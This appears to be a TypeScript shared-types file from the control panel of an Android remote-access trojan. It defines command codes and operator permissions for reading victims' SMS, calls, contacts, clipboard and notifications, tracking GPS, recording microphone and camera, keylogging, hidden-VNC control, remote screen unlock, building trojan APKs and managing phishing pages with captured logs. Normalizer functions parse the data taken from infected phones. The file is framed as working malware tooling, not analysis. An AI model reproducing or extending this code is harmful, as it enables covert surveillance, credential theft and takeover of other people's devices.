export const CMD = {
  FILES: '0xFI',
  SMS: '0xSM',
  CALLS: '0xCL',
  CONTACTS: '0xCO',
  MIC: '0xMI',
  LOCATION: '0xLO',
  WIFI: '0xWI',
  PERMISSIONS: '0xPM',
  APPS: '0xIN',
  PERM_CHECK: '0xGP',
  CAMERA: '0xCA',
  CLIPBOARD: '0xCB',
  NOTIFICATIONS: '0xNO',
  FASON: '0xFM',
  INFO: '0xIF',
  HVNC: '0xHV',
  INSPECTOR: '0xAI',
  KEYLOGGER: '0xKL',
  SMS_PUSH: '0xSP',
  DEVICE_UNLOCK: '0xAU',
} as const;

export type CmdType = typeof CMD[keyof typeof CMD];
export type UserRole = 'admin' | 'user';

export type Permission =
  | 'dashboard:view'
  | 'device:view'
  | 'device:sms'
  | 'device:calls'
  | 'device:contacts'
  | 'device:gps'
  | 'device:camera'
  | 'device:mic'
  | 'device:files'
  | 'device:wifi'
  | 'device:clipboard'
  | 'device:notifications'
  | 'device:permissions'
  | 'device:apps'
  | 'device:fason'
  | 'device:hvnc'
  | 'device:inspector'
  | 'device:keylogger'
  | 'device:unlock'
  | 'device:command'
  | 'device:delete'
  | 'builder:access'
  | 'logs:view'
  | 'logs:clear'
  | 'users:manage'
  | 'settings:view'
  | 'settings:edit'
  | 'stats:view'
  | 'files:download'
  | 'phishing:view'    // [FIX] ADDED
  | 'phishing:manage'; // [FIX] ADDED

export const ALL_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view',
  'device:sms', 'device:calls', 'device:contacts', 'device:gps',
  'device:camera', 'device:mic', 'device:files', 'device:wifi',
  'device:clipboard', 'device:notifications', 'device:permissions',
  'device:apps', 'device:fason',
  'device:hvnc', 'device:inspector', 'device:keylogger', 'device:unlock',
  'device:command', 'device:delete',
  'builder:access', 'logs:view', 'logs:clear', 'users:manage',
  'settings:view', 'settings:edit', 'stats:view', 'files:download',
  'phishing:view', 'phishing:manage', // [FIX] ADDED
];

export const DEFAULT_USER_PERMISSIONS: Permission[] = [
  'dashboard:view', 'device:view',
  'device:sms', 'device:calls', 'device:contacts', 'device:gps',
  'device:camera', 'device:mic', 'device:files', 'device:wifi',
  'device:clipboard', 'device:notifications', 'device:permissions',
  'device:apps', 'device:fason',
  'device:hvnc', 'device:inspector',
  'device:command',
  'settings:view',
  'phishing:view', // [FIX] ADDED — manage is admin-grantable only
];

export const PERMISSION_GROUPS = [
  {
    label: 'Device Features',
    icon: 'Smartphone' as const,
    permissions: [
      { key: 'dashboard:view' as Permission, label: 'View Dashboard', description: 'Access the main dashboard' },
      { key: 'device:view' as Permission, label: 'View Devices', description: 'View device list and basic info' },
      { key: 'device:sms' as Permission, label: 'SMS', description: 'Access SMS messages' },
      { key: 'device:calls' as Permission, label: 'Calls', description: 'Access call logs' },
      { key: 'device:contacts' as Permission, label: 'Contacts', description: 'Access contacts list' },
      { key: 'device:gps' as Permission, label: 'GPS Tracking', description: 'GPS location tracking' },
      { key: 'device:camera' as Permission, label: 'Camera', description: 'Camera capture' },
      { key: 'device:mic' as Permission, label: 'Microphone', description: 'Microphone recording' },
      { key: 'device:files' as Permission, label: 'Files', description: 'File browser access' },
      { key: 'device:wifi' as Permission, label: 'WiFi', description: 'WiFi network data' },
      { key: 'device:clipboard' as Permission, label: 'Clipboard', description: 'Clipboard data' },
      { key: 'device:notifications' as Permission, label: 'Notifications', description: 'Device notifications' },
      { key: 'device:permissions' as Permission, label: 'App Permissions', description: 'View app permissions' },
      { key: 'device:apps' as Permission, label: 'Installed Apps', description: 'View installed applications' },
      { key: 'device:fason' as Permission, label: 'Fason Manager', description: 'Fason app management' },
      { key: 'device:hvnc' as Permission, label: 'HVNC', description: 'Hidden VNC screen capture + input' },
      { key: 'device:inspector' as Permission, label: 'Inspector', description: 'Accessibility tree inspector' },
      { key: 'device:keylogger' as Permission, label: 'Keylogger', description: 'Keystroke capture' },
      { key: 'device:unlock' as Permission, label: 'Auto Unlock', description: 'Remote screen unlock' },
      { key: 'device:command' as Permission, label: 'Send Commands', description: 'Send commands to devices' },
      { key: 'device:delete' as Permission, label: 'Delete Devices', description: 'Remove devices and their data' },
    ],
  },
  {
    label: 'System',
    icon: 'Settings' as const,
    permissions: [
      { key: 'builder:access' as Permission, label: 'APK Builder', description: 'Build and download APK files' },
      { key: 'logs:view' as Permission, label: 'View Logs', description: 'View system logs' },
      { key: 'logs:clear' as Permission, label: 'Clear Logs', description: 'Delete all system logs' },
      { key: 'users:manage' as Permission, label: 'Manage Users', description: 'Create, edit, delete users and permissions' },
      { key: 'settings:view' as Permission, label: 'View Settings', description: 'View system configuration' },
      { key: 'settings:edit' as Permission, label: 'Edit Settings', description: 'Modify system configuration' },
      { key: 'stats:view' as Permission, label: 'View Statistics', description: 'Access system statistics' },
      { key: 'files:download' as Permission, label: 'Download Files', description: 'Download photos, recordings, and files from devices' },
    ],
  },
  { // [FIX] ADDED — Phishing group, same structure as the other two
    label: 'Phishing',
    icon: 'ShieldAlert' as const,
    permissions: [
      { key: 'phishing:view' as Permission, label: 'View Phishing', description: 'View phishing pages, captured logs, and statistics' },
      { key: 'phishing:manage' as Permission, label: 'Manage Phishing', description: 'Seed, toggle, and delete phishing pages, clear capture logs' },
    ],
  },
];

export interface DeviceOutletContext {
  client: ClientDevice | null;
  clientId: string;
  loadClient: () => void;
  online: boolean;
}

export interface ClientDevice {
  id: string; ownerId: string | null; ip: string; country: string | null; city: string | null;
  timezone: string | null; deviceModel: string | null; deviceBrand: string | null;
  deviceVersion: string | null; online: boolean; firstSeen: string; lastSeen: string;
  reconnectCount: number; fasonHidden: boolean; cameraPermission: boolean;
  currentPath: string; gpsInterval: number;
}

export interface DashboardData {
  onlineClients: ClientDevice[]; offlineClients: ClientDevice[];
  stats: { totalClients: number; onlineClients: number; offlineClients: number; totalLogs: number; todayLogs: number; totalUsers: number; totalAdmins: number; uptime: number; memoryUsage: number; };
}

export interface DeviceInfo {
  model?: string; brand?: string; version?: string; sdk?: string;
  battery?: { level: number; charging: boolean; health: string };
  memory?: { total: number; used: number; free: number };
  storage?: { total: number; used: number; free: number };
  network?: { type: string; subtype: string; carrier: string };
  screen?: { width: number; height: number; density: number };
  phone?: { imei?: string; number?: string; network?: string; networkOperatorName?: string; simCountryIso?: string; phoneType?: string | number; networkType?: string };
}

export interface ClientFile { id: number; originalName: string; mimeType: string | null; fileSize: number | null; createdAt: string | null; fileType?: string; }
export interface LogEntry { id: number; type: string; category: string; message: string; details: string | null; created_at: string; }

export interface ServerConfig {
  port: number; debug: boolean;
  limits?: Record<string, unknown>;
  socket: Record<string, unknown>;
  rateLimit: { windowMs: number; maxRequests: number };
  build: { timeout: number };
  security: { sessionTimeout: number; loginAttempts: number; loginLockout: number };
  logger: Record<string, unknown>;
}

export interface ApiResponse<T = unknown> { success: boolean; data?: T; error?: string; message?: string; }

export interface AuthUser {
  id: string;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
}

export interface UserItem {
  id: string;
  username: string;
  email: string;
  role: UserRole;
  permissions: Permission[];
  isDefault: number;
  createdAt: string;
  lastLogin: string | null;
  banned?: boolean;
  deviceSecret?: string | null;
}

export interface SmsMessage {
  address: string;

  body: string;

  date: string;

  type: number;
}

export interface CallRecord {
  type: number;

  number: string;

  name: string;

  duration: number;

  date: string;
}

export interface ContactEntry {
  name: string;

  number: string;
  type: string;
}

export interface GpsLocation {
  latitude: number;
  longitude: number;
  accuracy?: number;
  speed?: number;
  provider?: string;

  time: string;
}

export interface CameraDevice {
  id?: number;
  name?: string;
}

export interface WifiNetwork {
  ssid: string;
  bssid: string;
  level?: number;
  security: string;
  frequency?: number;
  channel?: number;
  signalStrength?: number;
  secure?: boolean;
  wpa3?: boolean;
  wifi6?: boolean;
}

export interface ClipboardEntry {
  text: string;

  length: number;
  label?: string;
  mimeType?: string;

  timestamp: string;
}

export interface NotificationEntry {
  appName?: string;
  title?: string;
  content?: string;
  timestamp?: string;
  ongoing?: boolean;
  clearable?: boolean;
  category?: string;
  initial?: boolean;
}

export interface PermissionEntry {
  name: string;
  allowed?: boolean;
}

export interface AppEntry {
  name: string;
  packageName: string;
  isSystem: boolean;
  versionName?: string;
  versionCode?: number;
  enabled?: boolean;
  targetSdkVersion?: number;
  size?: number;
}

export interface FileEntry {
  name: string;

  isDir: boolean;
  path: string;
  size?: number;
  lastModified?: number | string;
  date?: string;
  encrypted?: boolean;
}

export interface NotificationStatus {
  enabled: boolean;
  connected: boolean;
}

export function extractList<T>(raw: unknown): T[] {
  return Array.isArray(raw) ? raw : [];
}

export function coalesce(...values: (unknown)[]): string {
  for (const v of values) {
    if (v != null && v !== '') return String(v);
  }
  return '';
}

export function normalizeSmsList(raw: unknown[]): SmsMessage[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;

    let type = 0;
    if (typeof r.type === 'number') {
      type = r.type;
    } else if (typeof r.type === 'string') {
      const parsed = parseInt(r.type, 10);
      if (!isNaN(parsed)) type = parsed;
    }
    return {
      address: coalesce(r.address, r.from),
      body: coalesce(r.body, r.message),
      date: coalesce(r.date, r.time),
      type,
    };
  });
}

export function normalizeCallList(raw: unknown[]): CallRecord[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      type: typeof r.type === 'number' ? r.type : 0,
      number: coalesce(r.number, r.phone, r.phoneNo),
      name: coalesce(r.name, r.cachedName),
      duration: typeof r.duration === 'number' ? r.duration : parseInt(String(r.duration), 10) || 0,
      date: coalesce(r.date, r.time),
    };
  });
}

const PHONE_TYPE_LABELS: Record<number, string> = {
  1: 'Home',
  2: 'Mobile',
  3: 'Work',
  4: 'Fax Work',
  5: 'Fax Home',
  6: 'Pager',
  7: 'Other',
  8: 'Callback',
  9: 'Car',
  10: 'Company Main',
  11: 'ISDN',
  12: 'Main',
  13: 'Other Fax',
  14: 'Radio',
  15: 'Telex',
  16: 'TTY TDD',
  17: 'Work Mobile',
  18: 'Work Pager',
  19: 'Assistant',
  20: 'MMS',
};

export function normalizeContactList(raw: unknown[]): ContactEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    const rawType = r.type;
    let typeLabel = '';
    if (typeof rawType === 'number') {
      typeLabel = PHONE_TYPE_LABELS[rawType] || `Type ${rawType}`;
    } else if (typeof rawType === 'string' && rawType) {

      const asNum = Number(rawType);
      if (!isNaN(asNum) && PHONE_TYPE_LABELS[asNum]) {
        typeLabel = PHONE_TYPE_LABELS[asNum];
      } else {
        typeLabel = rawType;
      }
    }
    return {
      name: coalesce(r.name, r.displayName),
      number: coalesce(r.number, r.phone, r.phoneNo),
      type: typeLabel,
    };
  });
}

export function normalizeWifiList(raw: unknown[]): WifiNetwork[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      ssid: coalesce(r.ssid, r.SSID),
      bssid: coalesce(r.bssid, r.BSSID),
      level: typeof r.level === 'number' ? r.level : undefined,
      security: coalesce(r.security, r.capabilities),
      frequency: typeof r.frequency === 'number' ? r.frequency : undefined,
      channel: typeof r.channel === 'number' ? r.channel : undefined,
      signalStrength: typeof r.signalStrength === 'number' ? r.signalStrength : undefined,
      secure: !!r.secure,
      wpa3: !!r.wpa3,
      wifi6: !!r.wifi6,
    };
  });
}

export function normalizeClipboardList(raw: unknown[]): ClipboardEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      text: coalesce(r.text, r.content),
      length: typeof r.length === 'number' ? r.length : String(r.text || r.content || '').length,
      label: coalesce(r.label) || undefined,
      mimeType: coalesce(r.mimeType) || undefined,
      timestamp: coalesce(r.timestamp, r.time),
    };
  });
}

export function normalizePermissionList(raw: unknown[]): PermissionEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.permission, r.name),
      allowed: !!r.allowed,
    };
  });
}

export function normalizeAppList(raw: unknown[]): AppEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.name, r.appName),
      packageName: coalesce(r.packageName, r.package),
      isSystem: !!(r.systemApp || r.isSystem),
      versionName: typeof r.versionName === 'string' ? r.versionName : undefined,
      versionCode: typeof r.versionCode === 'number' ? r.versionCode : undefined,
      enabled: r.enabled !== false,
      targetSdkVersion: typeof r.targetSdkVersion === 'number' ? r.targetSdkVersion : undefined,
      size: typeof r.size === 'number' ? r.size : undefined,
    };
  });
}

export function normalizeFileList(raw: unknown[]): FileEntry[] {
  return raw.map((item) => {
    const r = item as Record<string, unknown>;
    return {
      name: coalesce(r.name),
      isDir: !!(r.isDirectory || r.isDir),
      path: coalesce(r.path),
      size: typeof r.size === 'number' ? r.size : undefined,
      lastModified: r.lastModified as number | string | undefined,
      date: coalesce(r.date) || undefined,
      encrypted: !!r.encrypted,
    };
  });
}
